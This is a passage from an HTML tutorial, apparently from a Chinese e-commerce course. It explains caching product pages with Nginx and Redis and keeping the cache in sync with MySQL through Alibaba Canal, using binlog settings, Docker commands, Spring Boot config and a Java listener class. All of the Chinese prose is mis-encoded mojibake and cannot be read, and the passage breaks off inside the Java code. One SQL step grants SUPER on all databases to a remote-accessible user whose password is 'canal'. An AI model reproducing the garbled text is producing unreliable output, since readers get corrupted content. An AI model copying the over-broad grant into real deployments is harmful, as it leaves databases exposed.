<p>åŸºæœ¬æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>ç”¨æˆ·è¯·æ±‚NginxæœåŠ¡ï¼Œè·å–åˆ°é™æ€é¡µé¢</li>
<li>ç„¶åé¡µé¢å‘èµ·ajaxï¼Œå‘TomcatæœåŠ¡è·å–æ•°æ®</li>
<li>TomcatæŸ¥è¯¢æ•°æ®åº“</li>
<li>é¡µé¢æ¸²æŸ“</li>
</ul>
<p>è¿™ç§æ¨¡å¼ä¸‹ï¼Œæ•°æ®åº“æˆä¸ºäº†ç“¶é¢ˆï¼Œé«˜å¹¶å‘æƒ…å†µä¸‹ï¼Œæ•°æ®åº“éš¾ä»¥æ”¯æ’‘ï¼Œå› æ­¤æˆ‘ä»¬å¯èƒ½ä¼šåœ¨æœåŠ¡ä¹‹å‰åŠ å…¥ç¼“å­˜ï¼Œå‡å°æ•°æ®åº“å‹åŠ›ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022663.png" alt="image-20200310173700012"></p>
<p>æ­¤æ—¶ï¼Œæ•´ä¸ªæœåŠ¡çš„å¹¶å‘èƒ½åŠ›ï¼Œå°±å—é™äºTomcatäº†ï¼Œä¸šåŠ¡ç»å¸¸å—åˆ°ä¾èµ–çš„æœåŠ¡ä¸ç¨³å®šè€Œå¯¼è‡´çš„æ€§èƒ½æŠ–åŠ¨ã€‚</p>
<h2 id="é™æ€åŒ–é¡µé¢"><a href="#é™æ€åŒ–é¡µé¢" class="headerlink" title="é™æ€åŒ–é¡µé¢"></a>é™æ€åŒ–é¡µé¢</h2><p>ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå°±æœ‰äº†é¡µé¢é™æ€åŒ–æ–¹æ¡ˆï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022664.png" alt="image-20200310174506082"></p>
<p>åŸºæœ¬æµç¨‹ï¼š</p>
<ul>
<li>å•†å“ä¿®æ”¹å‘é€æ¶ˆæ¯åˆ°MQ</li>
<li>å¾®æœåŠ¡ç›‘å¬MQï¼Œå¾—çŸ¥å•†å“å˜åŒ–ï¼Œæ¸²æŸ“å¹¶ç”Ÿæˆä¸€ä¸ªé™æ€é¡µé¢</li>
<li>ç”¨æˆ·è¯·æ±‚Nginx</li>
<li>Nginxç›´æ¥è¿”å›æ¸²æŸ“å¥½çš„é™æ€Html</li>
</ul>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ç”¨æˆ·è¯·æ±‚æ¸²æŸ“å¥½çš„Htmlï¼Œå“åº”é€Ÿåº¦å¿«</li>
<li>é€šè¿‡MQå¼‚æ­¥æ›´æ–°ï¼Œä¿è¯æ•°æ®åŒæ­¥</li>
</ul>
<p>ç¼ºé™·ï¼š</p>
<ul>
<li>å°éƒ¨åˆ†æ•°æ®å¦‚ä»·æ ¼å˜æ›´ï¼Œæ•´ä¸ªé™æ€é¡µéƒ½è¦é‡æ–°ç”Ÿæˆ</li>
<li>éšç€å•†å“æ•°é‡å¢åŠ ï¼Œé¡µé¢ä¼šè¶Šæ¥è¶Šå¤š</li>
<li>é¡µé¢æ¨¡æ¿å˜æ›´ï¼Œæ‰€æœ‰å•†å“çš„é™æ€é¡µéƒ½è¦é‡æ–°ç”Ÿæˆï¼Œéå¸¸å›°éš¾</li>
</ul>
<h2 id="åŠ¨æ€æ¨¡æ¿ï¼Œé™æ€åŒ–æ•°æ®"><a href="#åŠ¨æ€æ¨¡æ¿ï¼Œé™æ€åŒ–æ•°æ®" class="headerlink" title="åŠ¨æ€æ¨¡æ¿ï¼Œé™æ€åŒ–æ•°æ®"></a>åŠ¨æ€æ¨¡æ¿ï¼Œé™æ€åŒ–æ•°æ®</h2><p>æˆ‘ä»¬è¦è§£å†³çš„é—®é¢˜ï¼š</p>
<ul>
<li>èƒ½è¿…é€Ÿå“ç¬å˜çš„éœ€æ±‚ï¼Œå’Œå„ç§å˜æ€éœ€æ±‚ï¼›</li>
<li>æ”¯æŒå„ç§å‚ç›´åŒ–é¡µé¢æ”¹ç‰ˆï¼›</li>
<li>é¡µé¢æ¨¡å—åŒ–ï¼›</li>
<li>é«˜æ€§èƒ½ã€æ°´å¹³æ‰©å®¹ï¼›</li>
</ul>
<p>æ€ä¹ˆåŠï¼Ÿ</p>
<ul>
<li>å¦‚ä½•åšåˆ°åŠ¨æ€å“åº”éœ€æ±‚å˜åŒ–ï¼Œé¡µé¢å˜åŒ–ï¼Ÿ<ul>
<li>å°†é¡µé¢æ¨¡æ¿åŠ¨æ€åŒ–ï¼Œéœ€è¦çš„æ•°æ®é™æ€åŒ–</li>
</ul>
</li>
<li>å¦‚ä½•é¿å…æ•´ä¸ªé¡µé¢çš„å…¨é‡æ›´æ–°ï¼Ÿ<ul>
<li>æˆ‘ä»¬æŠŠé¡µé¢åˆ†æˆå‡ éƒ¨åˆ†ï¼šå¦‚é¡¶éƒ¨é¢åŒ…å±‘ã€å•†å“SKUå±•ç¤ºã€å•†å“æè¿°ã€å•†å“è¯„è®ºç­‰ï¼Œå½¢æˆå¤šä¸ªé¡µé¢æ¨¡æ¿ï¼ˆæ¨¡å—ï¼‰ã€‚å¯¹åº”çš„æ•°æ®ä¹Ÿåˆ†æˆå‡ éƒ¨åˆ†ï¼Œè¿™äº›æ•°æ®å¯èƒ½æ¥è‡ªä¸åŒçš„å¾®æœåŠ¡ã€‚è¿™æ ·å¯ä»¥å‡å°‘å› å±€éƒ¨å˜æ›´å¼•èµ·çš„æ•´ä¸ªé¡µé¢é‡æ–°ç”Ÿæˆã€‚</li>
</ul>
</li>
<li>å¦‚ä½•åº”å¯¹Tomcatçš„å¹¶å‘èƒ½åŠ›ä½é—®é¢˜ï¼Ÿ<ul>
<li>å°†æ¨¡æ¿æ¸²æŸ“ã€æ•°æ®æ”¾åˆ°nginxä¸­åšï¼Œåˆ©ç”¨nginxçš„é«˜å¹¶å‘èƒ½åŠ›æé«˜ç³»ç»Ÿååé‡</li>
</ul>
</li>
<li>å¦‚ä½•å®ç°æ•°æ®é™æ€åŒ–ï¼Ÿ<ul>
<li>éœ€è¦çš„æ•°æ®å¯ä»¥ç¼“å­˜åœ¨Nginxçš„æœ¬åœ°å…±äº«è¯å…¸ä¸­ï¼ˆé•¿æœŸä¸ä¼šä¿®æ”¹çš„æ•°æ®ï¼‰ï¼Œå¦‚æœå‘½ä¸­åˆ™ç›´æ¥æ¸²æŸ“å¹¶è¿”å›ã€‚å¦‚æœæœªå‘½ä¸­ï¼Œåˆ™æŸ¥è¯¢Redisé›†ç¾¤ï¼Œè·å–æ•°æ®ã€‚å¦‚æœRedisé›†ç¾¤ä¾ç„¶æœªå‘½ä¸­ï¼Œå†å»æŸ¥è¯¢åå°å¾®æœåŠ¡ï¼Œç”±å¾®æœåŠ¡è·å–æ•°æ®ï¼Œç„¶åå†™å…¥ç¼“å­˜ä¸­ï¼Œä¿è¯ä¸‹æ¬¡Nginxå¯ä»¥ä»ç¼“å­˜ä¸­æ‹¿åˆ°æ•°æ®ã€‚è¿™æ ·å¯ä»¥å‡å°‘æœåŠ¡ç«¯å‹åŠ›ã€‚</li>
</ul>
</li>
<li>å¦‚ä½•ä¿è¯æ•°æ®ä¸€è‡´æ€§ï¼Ÿ<ul>
<li>ä¸ºäº†ä¿è¯Redisæ•°æ®ä¸æ•°æ®åº“æ•°æ®ä¸€è‡´ï¼Œæˆ‘ä»¬è¿˜è¦ç”¨åˆ°CanalæŠ€æœ¯ï¼Œç›‘å¬æ•°æ®åº“å˜åŒ–ï¼ŒåŠæ—¶æ›´æ–°Redisæ•°æ®ã€‚</li>
</ul>
</li>
</ul>
<p>æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022665.png" alt="image-20210324234942982"></p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦åšçš„äº‹æƒ…åŒ…æ‹¬ï¼š</p>
<ul>
<li>é™æ€é¡µæ•°æ®æœåŠ¡ï¼šä¸€ä¸ªæ”¶é›†å•†å“ç›¸å…³æ•°æ®ï¼Œå¹¶æ›´æ–°Redisç¼“å­˜çš„æ•°æ®æœåŠ¡</li>
<li>NginxæœåŠ¡ï¼šæ¥æ”¶ç”¨æˆ·è¯·æ±‚ï¼ŒæŸ¥è¯¢æ¨¡æ¿æ•°æ®ï¼Œåˆ©ç”¨æ¨¡æ¿æ¸²æŸ“å•†å“é¡µé¢</li>
<li>CanalæœåŠ¡ï¼šç›‘å¬æ•°æ®åº“å˜åŒ–ï¼ŒåŒæ­¥é€šçŸ¥é™æ€é¡µæ•°æ®æœåŠ¡ï¼Œæ›´æ–°Redisæ•°æ®</li>
</ul>
<h2 id="ç¼“å­˜æ•°æ®åŒæ­¥"><a href="#ç¼“å­˜æ•°æ®åŒæ­¥" class="headerlink" title="ç¼“å­˜æ•°æ®åŒæ­¥"></a>ç¼“å­˜æ•°æ®åŒæ­¥</h2><p>å½“å•†å“ã€åˆ†ç±»ã€å“ç‰Œã€è§„æ ¼ç­‰æ•°æ®æ”¹å˜æ—¶ï¼ŒRedisä¸­æ•°æ®ä¹Ÿå¿…é¡»åŒæ­¥æ”¹å˜ï¼Œå¦‚ä½•åšåˆ°å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œæˆ‘ä»¬ä¼šé‡‡ç”¨Canalè¿™ä¸ªæ¡†æ¶æ¥å®ç°</p>
<h3 id="ä»€ä¹ˆæ˜¯Canal"><a href="#ä»€ä¹ˆæ˜¯Canal" class="headerlink" title="ä»€ä¹ˆæ˜¯Canal"></a>ä»€ä¹ˆæ˜¯Canal</h3><p>**canal [kÉ™â€™nÃ¦l]**ï¼Œè¯‘æ„ä¸ºæ°´é“&#x2F;ç®¡é“&#x2F;æ²Ÿæ¸ ï¼Œcanalæ˜¯é˜¿é‡Œå·´å·´æ——ä¸‹çš„ä¸€æ¬¾å¼€æºé¡¹ç›®ï¼ŒåŸºäºJavaå¼€å‘ã€‚åŸºäºæ•°æ®åº“å¢é‡æ—¥å¿—è§£æï¼Œæä¾›å¢é‡æ•°æ®è®¢é˜…&amp;æ¶ˆè´¹ã€‚</p>
<p>åŸºäºæ—¥å¿—å¢é‡è®¢é˜…å’Œæ¶ˆè´¹çš„ä¸šåŠ¡åŒ…æ‹¬</p>
<ul>
<li>æ•°æ®åº“é•œåƒ</li>
<li>æ•°æ®åº“å®æ—¶å¤‡ä»½</li>
<li>ç´¢å¼•æ„å»ºå’Œå®æ—¶ç»´æŠ¤(æ‹†åˆ†å¼‚æ„ç´¢å¼•ã€å€’æ’ç´¢å¼•ç­‰)</li>
<li>ä¸šåŠ¡ cache åˆ·æ–°</li>
<li>å¸¦ä¸šåŠ¡é€»è¾‘çš„å¢é‡æ•°æ®å¤„ç†</li>
</ul>
<p>å½“å‰çš„ canal æ”¯æŒæºç«¯ MySQL ç‰ˆæœ¬åŒ…æ‹¬ 5.1.x , 5.5.x , 5.6.x , 5.7.x , 8.0.x</p>
<p>åœ¨GitHubçš„åœ°å€ï¼š<a href="https://github.com/alibaba/canal">https://github.com/alibaba/canal</a></p>
<p>åŸºæœ¬åŸç†å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022666.png" alt="image-20200311220739591"></p>
<p>MySQLä¸»å¤‡å¤åˆ¶åŸç†</p>
<ul>
<li>MySQL master å°†<strong>æ•°æ®å˜æ›´</strong>å†™å…¥äºŒè¿›åˆ¶æ—¥å¿—( binary log, å…¶ä¸­è®°å½•å«åšäºŒè¿›åˆ¶æ—¥å¿—äº‹ä»¶binary log eventsï¼Œå¯ä»¥é€šè¿‡ show binlog events è¿›è¡ŒæŸ¥çœ‹)</li>
<li>MySQL slave å°† master çš„ binary log events æ‹·è´åˆ°å®ƒçš„ä¸­ç»§æ—¥å¿—(relay log)</li>
<li>MySQL slave é‡æ”¾ relay log ä¸­äº‹ä»¶ï¼Œå°†æ•°æ®å˜æ›´åæ˜ å®ƒè‡ªå·±çš„æ•°æ®</li>
</ul>
<p>canal å·¥ä½œåŸç†</p>
<ul>
<li>canal æ¨¡æ‹Ÿ MySQL slave çš„äº¤äº’åè®®ï¼Œä¼ªè£…è‡ªå·±ä¸º MySQL slave ï¼Œå‘ MySQL master å‘é€dump åè®®</li>
<li>MySQL master æ”¶åˆ° dump è¯·æ±‚ï¼Œå¼€å§‹æ¨é€ binary log ç»™ slave (å³ canal )</li>
<li>canal è§£æ binary log å¯¹è±¡(åŸå§‹ä¸º byte æµ)</li>
</ul>
<h3 id="è®¾ç½®ä¸»ä»åŒæ­¥"><a href="#è®¾ç½®ä¸»ä»åŒæ­¥" class="headerlink" title="è®¾ç½®ä¸»ä»åŒæ­¥"></a>è®¾ç½®ä¸»ä»åŒæ­¥</h3><p>ä¸‹é¢æˆ‘ä»¬å°±å¼€å¯mysqlçš„ä¸»ä»åŒæ­¥æœºåˆ¶ï¼Œè®©Canalæ¥æ¨¡æ‹Ÿsalve</p>
<p>è¿™é‡Œä»¥linuxç‰ˆæœ¬çš„mysqlä¸ºä¾‹</p>
<h4 id="è®¾ç½®binary-log"><a href="#è®¾ç½®binary-log" class="headerlink" title="è®¾ç½®binary log"></a>è®¾ç½®binary log</h4><p>æ ¹æ®ä¸Šé¢ä»‹ç»çš„åŸç†ï¼Œæˆ‘ä»¬é¦–å…ˆè¦å¼€å¯mysqlçš„binary logæ—¥å¿—ã€‚</p>
<p>æ‰“å¼€mysqlå®¹å™¨æŒ‚è½½çš„æ—¥å¿—æ–‡ä»¶ï¼Œæˆ‘çš„åœ¨<code>/home/leyou/mysql/conf</code>ç›®å½•:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022667.png" alt="image-20200311221433314"> </p>
<p>ä¿®æ”¹æ–‡ä»¶ï¼š</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /home/leyou/mysql/conf/my.cnf</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ å†…å®¹ï¼š</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">log-bin</span>=/var/lib/mysql/mysql-bin</span><br><span class="line"><span class="attr">server-id</span>=<span class="number">188</span></span><br><span class="line"><span class="attr">binlog-do-db</span>=heima</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆæ•ˆæœï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022668.png" alt="image-20200311223153680"></p>
<p>å¦‚æœæ˜¯windowsç‰ˆæœ¬ï¼Œä¿®æ”¹çš„æ˜¯dataç›®å½•ä¸‹çš„my.iniæ–‡ä»¶</p>
<p>é…ç½®è§£è¯»ï¼š</p>
<ul>
<li><code>log-bin=/var/lib/mysql/mysql-bin</code>ï¼šè®¾ç½®binary logæ–‡ä»¶çš„å­˜æ”¾åœ°å€</li>
<li><code>server-id=88</code>ï¼šè®¾ç½®å½“å‰æœåŠ¡id</li>
<li><code>binlog-do-db=heima</code>ï¼šè®¾ç½®ç”Ÿæˆbinary logçš„databaseåç§°ï¼Œè¿™é‡Œè®¾ç½®çš„æ˜¯heima</li>
</ul>
<h4 id="è®¾ç½®è´¦å·æƒé™"><a href="#è®¾ç½®è´¦å·æƒé™" class="headerlink" title="è®¾ç½®è´¦å·æƒé™"></a>è®¾ç½®è´¦å·æƒé™</h4><p>æ¥ä¸‹æ¥æ·»åŠ ä¸€ä¸ªä»…ç”¨äºæ•°æ®åŒæ­¥çš„è´¦æˆ·ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œè¿™é‡Œä»…æä¾›å¯¹heimaè¿™ä¸ªåº“çš„æ“ä½œæƒé™ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user canal@&#x27;%&#x27; IDENTIFIED by &#x27;canal&#x27;;</span><br><span class="line">GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT,SUPER ON *.* TO &#x27;canal&#x27;@&#x27;%&#x27; identified by &#x27;canal&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<p>é‡å¯mysqlå®¹å™¨å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker restart mysql</span><br></pre></td></tr></table></figure>



<p>æµ‹è¯•è®¾ç½®æ˜¯å¦æˆåŠŸï¼šåœ¨mysqlæ§åˆ¶å°ï¼Œæˆ–è€…Navicatä¸­ï¼Œè¾“å…¥å‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show master status;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022669.png" alt="image-20200327094735948"> </p>
<h4 id="å®‰è£…canal"><a href="#å®‰è£…canal" class="headerlink" title="å®‰è£…canal"></a>å®‰è£…canal</h4><p>æ‹‰å–é•œåƒï¼š</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker pull canal/canal-server</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå®¹å™¨ï¼š</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -p 11111:11111 --name canal \</span><br><span class="line">-e canal.destinations=<span class="built_in">test</span> \</span><br><span class="line">-e canal.instance.master.address=172.17.0.3:3306  \</span><br><span class="line">-e canal.instance.dbUsername=canal  \</span><br><span class="line">-e canal.instance.dbPassword=canal  \</span><br><span class="line">-e canal.instance.connectionCharset=UTF-8 \</span><br><span class="line">-e canal.instance.tsdb.enable=<span class="literal">true</span> \</span><br><span class="line">-e canal.instance.gtidon=<span class="literal">false</span>  \</span><br><span class="line">-e canal.instance.filter.regex=heima.tb_spu,heima.tb_sku,heima.tb_spu_detail,heima.tb_category,heima.tb_brand,heima.tb_spec_param \</span><br><span class="line">-d canal/canal-server</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -p 11111:11111 --name canal \</span><br><span class="line">-e canal.destinations=<span class="built_in">test</span> \</span><br><span class="line">-e canal.instance.master.address=172.17.0.3:3306  \</span><br><span class="line">-e canal.instance.dbUsername=canal  \</span><br><span class="line">-e canal.instance.dbPassword=canal  \</span><br><span class="line">-e canal.instance.connectionCharset=UTF-8 \</span><br><span class="line">-e canal.instance.tsdb.enable=<span class="literal">true</span> \</span><br><span class="line">-e canal.instance.gtidon=<span class="literal">false</span>  \</span><br><span class="line">-e canal.instance.filter.regex=.* \</span><br><span class="line">-d canal/canal-server</span><br></pre></td></tr></table></figure>



<p>è¯´æ˜:</p>
<ul>
<li><code>-p 11111:11111</code>ï¼šè¿™æ˜¯canalçš„é»˜è®¤ç›‘å¬ç«¯å£</li>
<li><code>-e canal.instance.master.address=172.17.0.3:3306</code>ï¼šæ•°æ®åº“åœ°å€å’Œç«¯å£ï¼Œå¦‚æœä¸çŸ¥é“mysqlå®¹å™¨åœ°å€ï¼Œå¯ä»¥é€šè¿‡<code>docker inspect å®¹å™¨id</code>æ¥æŸ¥çœ‹</li>
<li><code>-e canal.instance.dbUsername=canal</code>ï¼šæ•°æ®åº“ç”¨æˆ·å</li>
<li><code>-e canal.instance.dbPassword=canal</code> ï¼šæ•°æ®åº“å¯†ç </li>
<li><code>-e canal.instance.filter.regex=</code>ï¼šè¦ç›‘å¬çš„è¡¨åç§°</li>
</ul>
<p>è¡¨åç§°ç›‘å¬æ”¯æŒçš„è¯­æ³•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql æ•°æ®è§£æå…³æ³¨çš„è¡¨ï¼ŒPerlæ­£åˆ™è¡¨è¾¾å¼.</span><br><span class="line">å¤šä¸ªæ­£åˆ™ä¹‹é—´ä»¥é€—å·(,)åˆ†éš”ï¼Œè½¬ä¹‰ç¬¦éœ€è¦åŒæ–œæ (\\) </span><br><span class="line">å¸¸è§ä¾‹å­ï¼š</span><br><span class="line">1.  æ‰€æœ‰è¡¨ï¼š.*   or  .*\\..*</span><br><span class="line">2.  canal schemaä¸‹æ‰€æœ‰è¡¨ï¼š canal\\..*</span><br><span class="line">3.  canalä¸‹çš„ä»¥canalæ‰“å¤´çš„è¡¨ï¼šcanal\\.canal.*</span><br><span class="line">4.  canal schemaä¸‹çš„ä¸€å¼ è¡¨ï¼šcanal.test1</span><br><span class="line">5.  å¤šä¸ªè§„åˆ™ç»„åˆä½¿ç”¨ç„¶åä»¥é€—å·éš”å¼€ï¼šcanal\\..*,mysql.test1,mysql.test2 </span><br></pre></td></tr></table></figure>

<p>è®¾ç½®canalçš„è‡ªåŠ¨å¯åŠ¨ï¼š</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker update --restart=always canal</span><br></pre></td></tr></table></figure>



<p>ç°åœ¨ï¼Œcanalå°±ä¼šå»ç›‘å¬æˆ‘ä»¬çš„æ•°æ®åº“å˜åŒ–ï¼Œå¹¶é€šçŸ¥canalå®¢æˆ·ç«¯ã€‚</p>
<h3 id="ç¼–å†™canalå®¢æˆ·ç«¯"><a href="#ç¼–å†™canalå®¢æˆ·ç«¯" class="headerlink" title="ç¼–å†™canalå®¢æˆ·ç«¯"></a>ç¼–å†™canalå®¢æˆ·ç«¯</h3><p>æˆ‘ä»¬åœ¨<code>ly-page</code>ä¸­é…ç½®canalå®¢æˆ·ç«¯ï¼Œå½“æ•°æ®åº“å˜åŒ–æ—¶æˆ‘ä»¬å°±èƒ½å¾—åˆ°é€šçŸ¥ã€‚</p>
<h4 id="å¼•å…¥ä¾èµ–-1"><a href="#å¼•å…¥ä¾èµ–-1" class="headerlink" title="å¼•å…¥ä¾èµ–"></a>å¼•å…¥ä¾èµ–</h4><p>åœ¨<code>ly-page</code>çš„<code>pom.xml</code>ä¸­æ·»åŠ ä¾èµ–ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.javatool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>canal-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1-RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¼–å†™<code>ly-page</code>çš„é…ç½®æ–‡ä»¶<code>application.yml</code>ï¼ŒæŒ‡å®šcanalæœåŠ¡ç«¯åœ°å€ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="comment"># top.javatool.canal: warn # å…³é—­å¿ƒè·³æ—¥å¿—</span></span><br><span class="line">    <span class="attr">com.leyou:</span> <span class="string">debug</span> <span class="comment"># æ—¥å¿—é…ç½®</span></span><br><span class="line"><span class="attr">canal:</span></span><br><span class="line">  <span class="attr">destination:</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">server:</span> <span class="string">ly-canal:11111</span> <span class="comment"># canalåœ°å€</span></span><br></pre></td></tr></table></figure>



<h4 id="æ·»åŠ Redisæ“ä½œæ–¹æ³•"><a href="#æ·»åŠ Redisæ“ä½œæ–¹æ³•" class="headerlink" title="æ·»åŠ Redisæ“ä½œæ–¹æ³•"></a>æ·»åŠ Redisæ“ä½œæ–¹æ³•</h4><p>ç­‰ä¼šç›‘å¬åˆ°è¡¨çš„æ“ä½œåŒ…æ‹¬ï¼šå¢ã€åˆ ã€æ”¹</p>
<ul>
<li>å¢ã€æ”¹ï¼šæˆ‘ä»¬å†™å…¥æ•°æ®åˆ°redis</li>
<li>åˆ ï¼šæˆ‘ä»¬æŠŠæ•°æ®ä»redisåˆ é™¤</li>
</ul>
<p>è¿™é‡Œè¦ç›‘å¬çš„æ•°æ®æ¯”è¾ƒå¤šï¼Œä¸šåŠ¡ä»£ç è¾ƒå¤šï¼Œæˆ‘ä»¬ä»¥skuä¸ºä¾‹æ¥ç»™å¤§å®¶ä»‹ç»ã€‚</p>
<p>ç»™<code>ly-page</code>ä¸­çš„<code>GoodsPageService</code>ä¸­æ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŠŠSkuä»Redisåˆ é™¤</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">Boolean <span class="title function_">deleteSku</span><span class="params">(Long spuId)</span>;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>GoodsPageServiceImpl</code>ä¸­å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Boolean <span class="title function_">deleteSku</span><span class="params">(Long spuId)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> redisTemplate.delete(KEY_PREFIX_SKU + spuId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="ç¼–å†™ç›‘å¬å™¨"><a href="#ç¼–å†™ç›‘å¬å™¨" class="headerlink" title="ç¼–å†™ç›‘å¬å™¨"></a>ç¼–å†™ç›‘å¬å™¨</h4><p>æˆ‘ä»¬åœ¨ly-pageçš„<code>com.leyou.page.canal</code>åŒ…ä¸‹ï¼Œæ–°å¢ä¸€ä¸ªç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.page.canal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.page.service.GoodsPageService;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.annotation.CanalTable;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.context.CanalContext;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.handler.EntryHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@CanalTable(value = &quot;all&quot;)</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CanalHandler</span> <span class="keyword">implements</span> <span class="title class_">EntryHandler</span>&lt;Map&lt;String,String&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> GoodsPageService goodsPageService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(Map&lt;String,String&gt; model)</span> &#123;</span><br><span class="line">        <span class="comment">// è·å–è¡¨çš„åç§°</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="comment">// å¦‚æœè¡¨æ˜¯tb_sku</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;skuæ–°å¢äº†&#123;&#125;&quot;</span>, model);</span><br><span class="line">            goodsPageService.loadSkuListData(Long.valueOf(model.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(Map&lt;String,String&gt; before, Map&lt;String,String&gt; after)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;skuä¿®æ”¹äº†&#123;&#125;&quot;</span>, after);</span><br><span class="line">            goodsPageService.loadSkuListData(Long.valueOf(after.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(Map&lt;String,String&gt; model)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;skuåˆ é™¤äº†&#123;&#125;&quot;</span>, model);</span><br><span class="line">            goodsPageService.deleteSku(Long.valueOf(model.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 